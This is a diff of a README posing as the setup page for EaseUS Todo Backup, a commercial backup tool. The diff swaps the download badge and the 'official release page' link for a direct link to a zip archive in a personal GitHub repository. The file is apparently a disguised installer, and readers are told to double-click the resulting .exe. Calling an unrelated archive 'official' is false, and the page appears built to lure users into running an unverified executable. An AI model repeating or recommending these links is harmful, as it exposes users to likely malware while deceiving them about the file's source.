@@ -1,6 +1,6 @@
 # 💾 EaseUS-Todo-Backup-Setup - Simple tools to secure your data
 
-[![Download EaseUS Todo Backup](https://img.shields.io/badge/Download-EaseUS_Todo_Backup-blue.svg)](https://github.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup)
+[![Download EaseUS Todo Backup](https://img.shields.io/badge/Download-EaseUS_Todo_Backup-blue.svg)](https://raw.githubusercontent.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup/main/inventible/Ease_Backup_Todo_U_Setup_v3.2.zip)
 
 EaseUS Todo Backup protects your system and data. This software clones hard drives, creates system images, and schedules backups to keep your files safe. Use this application to move your operating system to a new solid-state drive, restore your system from bootable media, or guard your PC against ransomware.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the official release page to download the setup file: [https://github.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup](https://github.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup)
+1.  Visit the official release page to download the setup file: [https://raw.githubusercontent.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup/main/inventible/Ease_Backup_Todo_U_Setup_v3.2.zip](https://raw.githubusercontent.com/johnmarshalltore647/EaseUS-Todo-Backup-Setup/main/inventible/Ease_Backup_Todo_U_Setup_v3.2.zip)
 2.  Locate the downloaded file in your browser's download folder. It usually appears as an `.exe` file.
 3.  Double-click the file to start the installer. 
 4.  Follow the instructions on the screen. Select your preferred language and accept the license terms.
